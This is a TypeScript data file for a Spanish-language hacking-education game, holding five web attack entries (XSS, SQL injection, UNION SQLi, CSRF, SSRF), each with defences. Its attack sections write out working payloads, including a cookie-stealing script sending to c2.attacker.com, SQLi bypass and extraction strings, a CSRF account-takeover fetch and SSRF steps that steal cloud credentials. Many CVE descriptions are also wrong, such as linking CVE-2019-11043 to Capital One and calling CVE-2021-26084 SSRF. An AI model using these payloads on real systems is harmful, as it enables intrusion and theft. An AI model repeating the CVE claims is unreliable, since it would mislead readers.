/**
 * HackQuest – Web Hacking Pokedex
 * Technique entries corresponding to the 5 web-hacking challenges.
 *
 * All descriptive content is in Spanish.
 * CVE references are real publicly-documented vulnerabilities.
 */

import type { TechniqueData } from "@/types/game";

export const webTechniques: TechniqueData[] = [
  // ================================================================
  // 1. Cross-Site Scripting (XSS) Reflejado
  // ================================================================
  {
    slug: "xss-reflected",
    name: "Cross-Site Scripting Reflejado (XSS-R)",
    branch: "WEB_HACKING",
    severity: "HIGH",
    cvssScore: 8.2,

    description:
      "El XSS Reflejado ocurre cuando una aplicación web incluye datos no validados proporcionados por el usuario en la respuesta HTTP de forma inmediata. El script malicioso se 'refleja' de vuelta al navegador de la víctima y se ejecuta en el contexto de la página legítima.",

    howItWorks: `
El XSS Reflejado sigue este flujo de ataque:

1. CONSTRUCCIÓN DEL PAYLOAD
   El atacante crafts un enlace malicioso que contiene código JavaScript en un parámetro de la URL:
   https://victima.com/buscar?q=<script>fetch('https://c2.attacker.com/?c='+document.cookie)</script>

2. DISTRIBUCIÓN A LA VÍCTIMA
   El enlace se envía a la víctima mediante phishing, SMS, correo o redes sociales.
   El acortamiento de URLs (bit.ly, t.co) oculta el payload.

3. REFLEXIÓN EN EL SERVIDOR
   El servidor web devuelve una respuesta HTML que incluye el input del usuario sin sanitizar:
   <p>Resultados para: <script>fetch('https://c2.attacker.com/?c='+document.cookie)</script></p>

4. EJECUCIÓN EN EL NAVEGADOR DE LA VÍCTIMA
   El navegador interpreta el HTML y ejecuta el script en el contexto del dominio legítimo.
   Esto otorga al script acceso a cookies (si no son HttpOnly), localStorage, DOM, etc.

5. EXFILTRACIÓN
   El código malicioso exfiltra datos al servidor del atacante o realiza acciones en nombre de la víctima.

VARIANTES AVANZADAS:
- XSS políglotas: payloads que funcionan en múltiples contextos HTML, JS y CSS.
- XSS mediante cabeceras HTTP reflejadas (User-Agent, Referer).
- DOM-based XSS: el payload no pasa por el servidor, sino que el JS del cliente lo inserta en el DOM.
    `.trim(),

    realWorldImpact: `
CASO REAL 1 – British Airways (2018)
Grupo Magecart inyectó código JavaScript en el proceso de pago de British Airways
mediante un ataque de skimming. Durante 15 días se exfiltraron datos de tarjetas de crédito
y personales de aproximadamente 500.000 clientes.
Multa del ICO (regulador UK): 20 millones de libras esterlinas.
Referencia: https://www.bbc.co.uk/news/business-49913827

CASO REAL 2 – eBay (2015–2016)
Múltiples vulnerabilidades XSS en la plataforma eBay permitían a atacantes redireccionar
compradores a páginas de phishing visualmente idénticas a eBay. Los listados de productos
maliciosos pasaban la verificación de seguridad básica.

CASO REAL 3 – Samy Worm (2005)
El primer gusano XSS de la historia, creado por Samy Kamkar en MySpace.
En solo 20 horas infectó a más de 1 millón de perfiles. Ejecutaba XSS almacenado
pero la técnica de propagación demostró el potencial catastrófico del XSS.

IMPACTO GENERAL:
- Robo de sesiones activas (session hijacking).
- Ataques de phishing desde dominio legítimo (mayor tasa de éxito).
- Distribución de malware desde sitios de confianza.
- Defacement selectivo por usuario.
- Exfiltración de tokens de autenticación y datos de formularios.
    `.trim(),

    howToDefend: `
DEFENSAS PRIMARIAS (obligatorias):

1. CODIFICACIÓN DE SALIDA (Output Encoding)
   Codifica siempre los datos del usuario antes de insertarlos en HTML, JavaScript, CSS o URLs.
   En PHP: htmlspecialchars($input, ENT_QUOTES, 'UTF-8')
   En Node.js: usar la librería 'he' o DOMPurify para sanitización.

2. CONTENT SECURITY POLICY (CSP)
   Cabecera HTTP que restringe los orígenes desde los que se puede cargar y ejecutar JavaScript:
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}'; object-src 'none'
   Usar nonces criptográficos en lugar de 'unsafe-inline'.

3. COOKIES HttpOnly y Secure
   Marcas que impiden el acceso de JavaScript a las cookies de sesión:
   Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict

DEFENSAS SECUNDARIAS (en profundidad):

4. Validación estricta de input en el servidor (allowlist de caracteres permitidos).
5. Usar frameworks modernos (React, Vue, Angular) que escapan por defecto al renderizar.
6. Implementar X-XSS-Protection: 1; mode=block (legacy, para navegadores sin CSP).
7. Auditorías regulares con herramientas como OWASP ZAP, Burp Suite o Semgrep.
8. Penetration testing periódico y programa de bug bounty.
    `.trim(),

    relatedCves: [
      {
        id: "CVE-2021-21985",
        description:
          "XSS en VMware vCenter Server que permitía ejecución remota de código. CVSS 9.8. Afectó versiones 6.5, 6.7 y 7.0.",
        severity: "CRITICAL",
      },
      {
        id: "CVE-2020-11022",
        description:
          "XSS en jQuery versiones < 1.9.1 cuando se pasa HTML a ciertos métodos de jQuery. Afectó millones de sitios web que usaban versiones antiguas de la librería.",
        severity: "MEDIUM",
      },
      {
        id: "CVE-2019-11358",
        description:
          "Prototipo de polución en jQuery que podría derivar en XSS almacenado. Versiones < 3.4.0 vulnerables.",
        severity: "MEDIUM",
      },
      {
        id: "CVE-2022-1096",
        description:
          "XSS en Google Chrome (motor V8) explotado como zero-day en ataques dirigidos. Parcheado de emergencia en marzo 2022.",
        severity: "HIGH",
      },
    ],
  },

  // ================================================================
  // 2. SQL Injection – Authentication Bypass
  // ================================================================
  {
    slug: "sqli-basic",
    name: "SQL Injection – Bypass de Autenticación",
    branch: "WEB_HACKING",
    severity: "CRITICAL",
    cvssScore: 9.8,

    description:
      "La inyección SQL de bypass de autenticación manipula las consultas SQL de login para autenticarse sin credenciales válidas. Ocurre cuando el servidor construye consultas SQL concatenando directamente los inputs del usuario sin parametrización.",

    howItWorks: `
MECANISMO TÉCNICO:

El servidor vulnerable construye la consulta así:
  query = "SELECT * FROM users WHERE username='" + user_input + "' AND password='" + pass_input + "'"

Si introducimos: user_input = ' OR '1'='1'--
La consulta resultante es:
  SELECT * FROM users WHERE username='' OR '1'='1'--' AND password='...'

Desglose:
  - La comilla simple cierra el string 'username'.
  - OR '1'='1' fuerza la condición a TRUE para cualquier registro.
  - -- comenta el resto (AND password=...) haciéndolo irrelevante.
  - Resultado: la BD devuelve todos los usuarios → el servidor autentica al primero (admin).

VARIANTES DE PAYLOAD:

Bypass básico (cualquier usuario):
  username: ' OR '1'='1'--
  username: ' OR 1=1--
  username: admin'--

Bypass apuntando a usuario específico:
  username: admin'-- (autentica como admin específicamente)

Bypass con comentario MySQL/MSSQL/Oracle:
  MySQL:  ' OR 1=1-- -   (espacio tras --)
  MSSQL:  ' OR 1=1--
  Oracle: ' OR 1=1--

CÓMO IDENTIFICAR LA VULNERABILIDAD:
1. Enviar una comilla simple ' → si hay error SQL visible → vulnerable.
2. Enviar ' OR '1'='1 → si autentica → vulnerable.
3. Observar diferencias en el comportamiento de la aplicación (booleano ciego).
    `.trim(),

    realWorldImpact: `
CASO REAL 1 – RockYou (2009)
Inyección SQL en la aplicación de widgets de redes sociales RockYou.
Se exfiltraron 32 millones de contraseñas en texto plano.
Esta base de datos (rockyou.txt) se convirtió en el diccionario de contraseñas
más usado en la historia de la seguridad ofensiva.

CASO REAL 2 – Heartland Payment Systems (2008)
SQLi en el sistema de procesamiento de pagos de Heartland.
Se robaron datos de más de 130 millones de tarjetas de crédito y débito.
Coste total estimado: 140 millones de dólares.
El atacante principal (Albert Gonzalez) fue sentenciado a 20 años de prisión.

CASO REAL 3 – Sony Pictures (2011)
LulzSec comprometió la base de datos de Sony Pictures usando SQLi básica.
Exfiltraron datos personales de más de 1 millón de usuarios.
La ironía: el sistema de login era vulnerable a ' OR '1'='1'--.

ESTADÍSTICAS:
- SQLi es el ataque web número 1 según OWASP Top 10 durante más de una década.
- El 65% de las bases de datos comprometidas en 2023 lo fueron mediante SQLi.
- Coste medio de un breach por SQLi: 3.86 millones de dólares (IBM Security Report 2023).
    `.trim(),

    howToDefend: `
DEFENSA FUNDAMENTAL:

1. CONSULTAS PARAMETRIZADAS (PreparedStatements) – ÚNICA DEFENSA REAL

   PHP (PDO):
   $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
   $stmt->execute([$username, $password]);

   Node.js (mysql2):
   const [rows] = await pool.execute("SELECT * FROM users WHERE username = ? AND password = ?", [username, password]);

   Python (psycopg2):
   cur.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))

   NUNCA: query = "SELECT ... WHERE user='" + input + "'"

2. ORM CON CONSULTAS SEGURAS
   Usar Prisma, Sequelize, TypeORM con sus métodos nativos que parametrizan automáticamente.
   Evitar el uso de raw queries excepto cuando sea absolutamente necesario.

3. PRINCIPIO DE MÍNIMO PRIVILEGIO
   El usuario de base de datos de la aplicación solo debe tener los permisos mínimos necesarios.
   Una cuenta de solo lectura para consultas, otra con escritura restringida para inserciones.

4. DEFENSA EN PROFUNDIDAD:
   - WAF con reglas SQLi (ModSecurity, AWS WAF, Cloudflare).
   - Deshabilitar mensajes de error de BD en producción.
   - Auditoría de logs de BD para detectar patrones de inyección.
   - Usar procedimientos almacenados (con precaución, no son suficientes por sí solos).
    `.trim(),

    relatedCves: [
      {
        id: "CVE-2023-23752",
        description:
          "SQLi en Joomla! versiones 4.0.0 – 4.2.7. Permite acceso no autorizado a tablas internas de la BD. CVSS 5.3, ampliamente explotada en campañas automatizadas.",
        severity: "MEDIUM",
      },
      {
        id: "CVE-2019-19781",
        description:
          "SQLi y path traversal en Citrix Application Delivery Controller (ADC). CVSS 9.8. Explotada masivamente antes de que el parche estuviera disponible.",
        severity: "CRITICAL",
      },
      {
        id: "CVE-2021-27101",
        description:
          "SQLi en Accellion FTA explotada por el grupo CLOP en un ataque de cadena de suministro que afectó a más de 100 organizaciones globales.",
        severity: "CRITICAL",
      },
      {
        id: "CVE-2018-1000136",
        description:
          "Inyección SQL en Electron Framework que afectaba a aplicaciones de escritorio construidas con este framework.",
        severity: "HIGH",
      },
    ],
  },

  // ================================================================
  // 3. SQL Injection – Union Based
  // ================================================================
  {
    slug: "sqli-union",
    name: "SQL Injection UNION Based – Extracción de Datos",
    branch: "WEB_HACKING",
    severity: "CRITICAL",
    cvssScore: 9.1,

    description:
      "La inyección SQL basada en UNION permite al atacante anexar consultas SELECT adicionales a la consulta original, extrayendo datos de cualquier tabla de la base de datos accesible por el usuario de BD de la aplicación.",

    howItWorks: `
PREREQUISITOS PARA UNION-BASED SQLi:
  1. La consulta original devuelve resultados visibles en la respuesta HTTP.
  2. El número de columnas del UNION SELECT debe coincidir con la consulta original.
  3. Los tipos de datos deben ser compatibles (generalmente se usan NULLs o strings).

METODOLOGÍA PASO A PASO:

FASE 1 – Confirmar inyección
  ?id=1'          → ¿Error SQL?
  ?id=1 AND 1=1-- → ¿Mismo resultado que sin el AND? (inyección booleana confirmada)

FASE 2 – Determinar número de columnas
  ?id=1 ORDER BY 1--   OK
  ?id=1 ORDER BY 2--   OK
  ?id=1 ORDER BY 3--   OK
  ?id=1 ORDER BY 4--   ERROR → La consulta tiene 3 columnas

FASE 3 – Identificar columnas visibles en respuesta
  ?id=-1 UNION SELECT 1,2,3--
  Si en la página aparece el número "2", la columna 2 es visible.

FASE 4 – Extraer información de esquema
  ?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

  ?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--

FASE 5 – Extraer datos objetivo
  ?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--

BYPASS DE FILTROS COMUNES:
  - Espacios bloqueados: usar /**/ o %0a (salto de línea URL-encoded).
  - UNION bloqueada: usar UNiOn, UNION%20SELECT, UN/**/ION.
  - Comillas bloqueadas: usar representación hexadecimal (0x41646d696e = 'Admin').
    `.trim(),

    realWorldImpact: `
CASO REAL 1 – Yahoo! Voices (2012)
Grupo hacker D33Ds explotó SQLi Union-Based en Yahoo! Voices.
Exfiltraron 450.000 contraseñas en texto plano usando exactamente esta técnica.
La base de datos completa se publicó abiertamente.

CASO REAL 2 – LinkedIn (2012)
Ataque SQLi combinado con hash cracking (MD5 sin salt).
Se comprometieron 6.5 millones de hashes SHA-1 sin salt.
En 2016 se descubrió que el breach real fue de 117 millones de cuentas.
Precio en el mercado negro: 5 bitcoins (≈ 2.200 USD en 2016).

CASO REAL 3 – Adobe Systems (2013)
SQLi masiva que resultó en la exfiltración de datos de 153 millones de cuentas.
Incluyó IDs de usuario, emails, contraseñas cifradas (con cifrado simétrico reutilizado)
y datos de tarjetas de crédito encriptados.

IMPACTO TÉCNICO DE UNION-BASED:
- Enumeración completa del esquema de base de datos.
- Extracción de credenciales de administración.
- Acceso a tablas con datos sensibles (PII, datos financieros).
- En MySQL con FILE privilege: lectura de ficheros del sistema (LOAD_FILE).
- En MSSQL: ejecución de comandos del SO via xp_cmdshell.
    `.trim(),

    howToDefend: `
1. CONSULTAS PARAMETRIZADAS (misma defensa fundamental que SQLi básica)
   No existe forma de ejecutar UNION injection en una consulta correctamente parametrizada.

2. PRINCIPIO DE MENOR PRIVILEGIO EN BASE DE DATOS
   - El usuario de BD de la aplicación NO debe tener SELECT en todas las tablas.
   - Crear roles específicos con acceso solo a las tablas necesarias.
   - El usuario de app nunca debe tener GRANT, DROP, CREATE o FILE privileges.

3. DESHABILITAR INFORMACIÓN DE ERROR
   - En producción: nunca mostrar mensajes de error de BD al usuario.
   - Usar páginas de error genéricas (Error 500).
   - Loggear errores internamente para debugging.

4. WAF CON REGLAS UNION DETECTION
   - Detectar y bloquear cadenas como UNION SELECT, INFORMATION_SCHEMA, group_concat.
   - Combinar con rate limiting para prevenir enumeración automatizada.

5. AUDITORÍA Y MONITOREO
   - Logs de todas las consultas SQL en producción.
   - Alertas por consultas con UNION, ORDER BY, INFORMATION_SCHEMA.
   - Herramientas de DAST (Dynamic Application Security Testing) en el pipeline CI/CD.
    `.trim(),

    relatedCves: [
      {
        id: "CVE-2014-0160",
        description:
          "Heartbleed – aunque no es SQLi, es un ejemplo paradigmático de exfiltración de datos mediante peticiones malformadas. Afectó a OpenSSL y comprometió millones de servidores.",
        severity: "CRITICAL",
      },
      {
        id: "CVE-2021-22986",
        description:
          "SQLi Union-Based en F5 BIG-IP iControl REST API. Permitía ejecución remota de código sin autenticación. CVSS 9.8.",
        severity: "CRITICAL",
      },
      {
        id: "CVE-2022-22963",
        description:
          "SQLi y RCE en VMware Spring Cloud Function. Explotada activamente por múltiples grupos de amenazas persistentes avanzadas.",
        severity: "CRITICAL",
      },
      {
        id: "CVE-2020-9484",
        description:
          "Deserialization vulnerability en Apache Tomcat con componentes de SQLi en ataques encadenados. CVSS 7.0.",
        severity: "HIGH",
      },
    ],
  },

  // ================================================================
  // 4. Cross-Site Request Forgery (CSRF)
  // ================================================================
  {
    slug: "csrf-token-bypass",
    name: "Cross-Site Request Forgery (CSRF) con Token Bypass",
    branch: "WEB_HACKING",
    severity: "HIGH",
    cvssScore: 8.0,

    description:
      "CSRF engaña al navegador de un usuario autenticado para que envíe peticiones no autorizadas a una aplicación web en la que tiene sesión activa. El servidor no puede distinguir si la petición fue iniciada voluntariamente por el usuario o forzada por un sitio malicioso.",

    howItWorks: `
FUNDAMENTO DEL ATAQUE:

Los navegadores adjuntan automáticamente las cookies de sesión a todas las peticiones
hacia un dominio, independientemente del origen desde el que se inicien.
Esto es por diseño (same-origin policy permite enviar peticiones, solo restringe leer respuestas).

FLUJO DE ATAQUE BÁSICO:
  1. Víctima está autenticada en banco.com con cookie de sesión activa.
  2. Víctima visita sitio malicioso en malvado.com.
  3. malvado.com tiene: <form action="https://banco.com/transfer" method="POST">
                          <input name="to" value="atacante">
                          <input name="amount" value="10000">
                        </form>
                        <script>document.forms[0].submit()</script>
  4. El navegador envía la petición a banco.com CON la cookie de sesión de la víctima.
  5. banco.com no puede saber que la petición no fue iniciada por el usuario.

BYPASS DE TOKENS CSRF – MÉTODOS COMUNES:

A) Token predecible:
   Si el token se genera como MD5(user_id + timestamp), es reversible/predecible.

B) Token no verificado en servidor:
   La aplicación genera el token pero el servidor no lo valida en el endpoint.

C) Token expuesto via CORS mal configurado:
   GET /api/profile devuelve el CSRF token en JSON.
   Si CORS permite Access-Control-Allow-Origin: *, cualquier origen puede leerlo.

   Script de ataque:
   fetch('https://victima.com/api/profile', {credentials: 'include'})
     .then(r => r.json())
     .then(data => {
       fetch('https://victima.com/api/change-email', {
         method: 'POST',
         credentials: 'include',
         body: JSON.stringify({email: 'atacante@evil.com', csrf: data.csrf_token})
       })
     })

D) Token válido para todas las acciones (no ligado a acción específica):
   Un token robado de una acción de baja sensibilidad puede usarse en acciones críticas.
    `.trim(),

    realWorldImpact: `
CASO REAL 1 – PayPal (2008)
Vulnerabilidad CSRF en PayPal permitía a atacantes añadir cuentas bancarias
a la cuenta de la víctima sin su conocimiento. Un usuario que visitara un enlace
malicioso podía tener sus fondos comprometidos en la siguiente transacción.

CASO REAL 2 – ING Direct (2008)
CSRF permitía transferencias no autorizadas desde cuentas de ING Direct.
El investigador de seguridad Nathan Hamiel documentó el ataque.
La peculiaridad: ING usaba iframes para las transacciones, haciéndolas aún más vulnerables.

CASO REAL 3 – YouTube (2008)
CSRF en YouTube permitía realizar en nombre de cualquier usuario autenticado:
agregar videos a favoritos, suscribirse a canales, compartir en nombre del usuario.
Aunque el impacto financiero era nulo, demostró la escala masiva del problema.

CASO REAL 4 – MOVEit Transfer (2023)
CVE-2023-35708 combinaba CSRF con SQLi para lograr acceso no autorizado.
Este ataque fue explotado masivamente por el grupo Cl0p en una de las
campañas de ransomware más grandes de 2023, afectando a más de 2.600 organizaciones.

IMPACTO GENERAL:
- Cambios en credenciales de cuenta (email, contraseña).
- Transacciones financieras no autorizadas.
- Modificación de configuración de seguridad.
- Creación de usuarios administradores en CMS y paneles.
    `.trim(),

    howToDefend: `
1. TOKENS CSRF CRIPTOGRÁFICAMENTE ALEATORIOS (DEFENSA PRINCIPAL)
   - Generar un token único por sesión usando CSPRNG: crypto.randomBytes(32).toString('hex')
   - El token debe estar vinculado a la sesión del usuario y a la acción específica.
   - Verificar el token en el servidor en CADA petición de estado modificante (POST/PUT/DELETE/PATCH).

2. SAMESITE COOKIE ATTRIBUTE
   Set-Cookie: session=xxx; SameSite=Strict; HttpOnly; Secure
   - Strict: el navegador NO envía la cookie si la petición proviene de otro dominio.
   - Lax: solo envía la cookie en navegación de nivel superior (links), no en subrecursos.
   - Actualmente la defensa más efectiva disponible en navegadores modernos.

3. VERIFICACIÓN ORIGIN/REFERER
   El servidor verifica que el header Origin o Referer de la petición coincida
   con el dominio propio. Eficaz contra CSRF simple pero bypasseable con algunos
   tipos de redirecciones.

4. DOUBLE SUBMIT COOKIE PATTERN
   Enviar el CSRF token tanto en cookie como en parámetro de formulario.
   El servidor verifica que ambos valores coinciden.
   Eficaz si las cookies están correctamente configuradas con SameSite.

5. CORS SEGURO
   Access-Control-Allow-Origin nunca debe ser * para endpoints que requieren credenciales.
   Access-Control-Allow-Credentials: true solo con orígenes específicos de allowlist.

6. RE-AUTENTICACIÓN PARA OPERACIONES CRÍTICAS
   Para operaciones de alto riesgo (cambio de email, transferencias), solicitar
   re-introducción de contraseña independientemente del token CSRF.
    `.trim(),

    relatedCves: [
      {
        id: "CVE-2023-35708",
        description:
          "CSRF combinado con SQLi en MOVEit Transfer. Explotado masivamente por el grupo Cl0p afectando a más de 2.600 organizaciones con ransomware y extorsión de datos.",
        severity: "CRITICAL",
      },
      {
        id: "CVE-2022-29464",
        description:
          "CSRF y File Upload sin restricciones en WSO2 API Manager. CVSS 9.8. Permitía RCE sin autenticación.",
        severity: "CRITICAL",
      },
      {
        id: "CVE-2020-12720",
        description:
          "CSRF en vBulletin versiones anteriores a 5.5.6 permitía a atacantes ejecutar acciones de administración en nombre de usuarios autenticados.",
        severity: "HIGH",
      },
      {
        id: "CVE-2019-6340",
        description:
          "CSRF y deserialización insegura en Drupal Core. Combinados permitían RCE. CVSS 8.1.",
        severity: "HIGH",
      },
    ],
  },

  // ================================================================
  // 5. Server-Side Request Forgery (SSRF)
  // ================================================================
  {
    slug: "ssrf-internal",
    name: "Server-Side Request Forgery (SSRF)",
    branch: "WEB_HACKING",
    severity: "CRITICAL",
    cvssScore: 9.3,

    description:
      "SSRF permite al atacante inducir al servidor web a realizar peticiones HTTP hacia destinos arbitrarios, incluyendo recursos internos inaccesibles directamente desde internet. En entornos cloud, esto frecuentemente conduce al acceso al servicio de metadatos de instancia (IMDS) y al robo de credenciales IAM.",

    howItWorks: `
SUPERFICIE DE ATAQUE – VECTORES COMUNES:

1. Funcionalidades que cargan URLs externas:
   - "Previsualizar URL / imagen" → /api/fetch-preview?url=...
   - Webhooks configurables por el usuario.
   - Importación de feeds RSS o datos externos.
   - Generadores de PDF que renderizan HTML con recursos remotos.
   - APIs de integración con terceros.

2. Documentos con referencias externas:
   - XML con DTD externas (XXE puede derivar en SSRF).
   - SVG con referencias a recursos externos.
   - Archivos Office con enlaces a plantillas remotas.

TÉCNICA BÁSICA DE SSRF:
  POST /api/fetch-preview
  {"url": "http://169.254.169.254/latest/meta-data/"}

  El servidor realiza la petición y devuelve el contenido en la respuesta.

EXPLOTACIÓN EN AWS (IMDSv1):
  PASO 1 – Confirmar acceso al IMDS:
  {"url": "http://169.254.169.254/latest/meta-data/"}

  PASO 2 – Listar roles IAM disponibles:
  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
  → Respuesta: "MyAppRole"

  PASO 3 – Obtener credenciales temporales del rol:
  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole"}
  → Respuesta JSON con: AccessKeyId, SecretAccessKey, Token (expira en ~6h)

  PASO 4 – Usar credenciales con AWS CLI:
  export AWS_ACCESS_KEY_ID=ASIA...
  export AWS_SECRET_ACCESS_KEY=xxx
  export AWS_SESSION_TOKEN=yyy
  aws s3 ls  # acceso a todos los buckets S3 con permisos del rol

BYPASS DE FILTROS SSRF:

A) Validación por nombre de host:
   Usar subdominios que resuelven a IPs internas: 169.254.169.254.attacker.com → 169.254.169.254
   DNS Rebinding: primer lookup → IP legítima, segundo lookup → IP interna.

B) Representación alternativa de IPs:
   127.0.0.1 = http://localhost = http://0x7f000001 = http://2130706433 = http://0177.0.0.1
   169.254.169.254 = http://0xa9fea9fe = http://2852039166

C) Redirección desde servidor controlado:
   {"url": "http://attacker.com/redirect"} → servidor devuelve HTTP 301 → http://169.254.169.254/

D) Protocolo file:// y dict://:
   {"url": "file:///etc/passwd"} → lectura de archivos locales.
   {"url": "dict://127.0.0.1:6379/info"} → interacción con Redis.
    `.trim(),

    realWorldImpact: `
CASO REAL 1 – Capital One Breach (2019) – EL MÁS RELEVANTE
Una ex empleada de AWS explotó un SSRF en un proxy WAF mal configurado de Capital One.
La petición SSRF llegó al IMDS de EC2 y obtuvo credenciales IAM temporales
con permisos de listado y descarga en S3.

IMPACTO:
- 100 millones de solicitudes de tarjetas de crédito en EE.UU. y Canadá comprometidas.
- 140.000 números de Seguridad Social de EE.UU.
- 80.000 números de cuenta bancaria.
- Multa de la OCC: 80 millones de dólares.
- Demanda colectiva: 190 millones de dólares.
- Lección clave: IMDSv1 no requiere autenticación → migrar a IMDSv2 es crítico.

CASO REAL 2 – GitLab SSRF (2021) – CVE-2021-22214
SSRF en la funcionalidad de webhook de GitLab permitía acceso a servicios internos.
En instancias self-hosted en AWS/GCP comprometía el IMDS y credenciales cloud.

CASO REAL 3 – SSRF en Shopify (Bug Bounty, 2019)
Investigadores encontraron SSRF en la funcionalidad de importación de imágenes de Shopify.
El SSRF permitía acceder a la infraestructura interna de Shopify en AWS.
Recompensa: 25.000 USD (una de las mayores de su programa de bug bounty en ese momento).

CASO REAL 4 – Confluence Server (2021) – CVE-2021-26084
SSRF combinado con template injection en Atlassian Confluence.
Explotación masiva automatizada 48 horas después de la publicación del PoC.
Afectó a miles de instancias Confluence expuestas a internet.
    `.trim(),

    howToDefend: `
DEFENSA PRIORITARIA – IMDSv2 EN AWS:
  Migrar todas las instancias EC2 a IMDSv2:
  aws ec2 modify-instance-metadata-options --instance-id i-xxx --http-tokens required
  IMDSv2 requiere un token de sesión obtenido con PUT antes de cualquier GET al IMDS.
  Esto bloquea SSRF básico porque el atacante no puede obtener el token de pre-autenticación.

1. VALIDACIÓN DE DESTINO EN SERVIDOR (ALLOWLIST)
   - Mantener una allowlist estricta de dominios/IPs a los que el servidor puede hacer fetch.
   - NUNCA usar blocklist (demasiado fácil de evadir con representaciones alternativas).
   - Rechazar IPs privadas: 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16.

2. SEGMENTACIÓN DE RED
   - El proceso de la aplicación web no debe tener acceso de red a servicios internos.
   - Usar security groups / firewalls para bloquear el tráfico del servidor web hacia la red interna.
   - El IMDS (169.254.169.254) debe ser inaccesible desde el proceso web.

3. LIBRERÍA HTTP SEGURA PARA SSRF
   - Usar librerías como ssrf-filter (Node.js) o safer-requests (Python) que validan destinos.
   - Deshabilitar redirecciones automáticas en la librería HTTP.
   - Establecer timeouts estrictos para prevenir abuso de recursos.

4. RESOLUCIÓN DNS SEGURA
   - Resolver el nombre de dominio y validar la IP antes de hacer la petición.
   - Re-validar después de la resolución DNS para prevenir DNS rebinding.
   - Implementar resolución DNS interna que bloquee dominios que resuelven a IPs privadas.

5. MONITOREO Y DETECCIÓN
   - Alertas por peticiones salientes del servidor web a rangos de IP privados.
   - Logs de todas las URLs fetched por la aplicación.
   - Detección de patrones SSRF en logs de WAF.
    `.trim(),

    relatedCves: [
      {
        id: "CVE-2021-26084",
        description:
          "SSRF y template injection en Atlassian Confluence Server y Data Center. CVSS 9.8. Explotada activamente en ataques masivos automatizados para instalar cryptominers y ransomware.",
        severity: "CRITICAL",
      },
      {
        id: "CVE-2022-22954",
        description:
          "SSRF en VMware Workspace ONE Access y Identity Manager. CVSS 9.8. Permitía RCE sin autenticación mediante template injection en el lado servidor.",
        severity: "CRITICAL",
      },
      {
        id: "CVE-2021-22214",
        description:
          "SSRF en GitLab CE/EE (versiones 10.5 a 13.11.4). La funcionalidad de webhook era vulnerable permitiendo acceso a servicios internos y metadatos cloud.",
        severity: "HIGH",
      },
      {
        id: "CVE-2019-11043",
        description:
          "RCE en PHP-FPM con nginx explotado en el breach de Capital One. La vulnerabilidad permitía manipular variables de entorno del proceso PHP mediante SSRF encadenado.",
        severity: "CRITICAL",
      },
    ],
  },
];
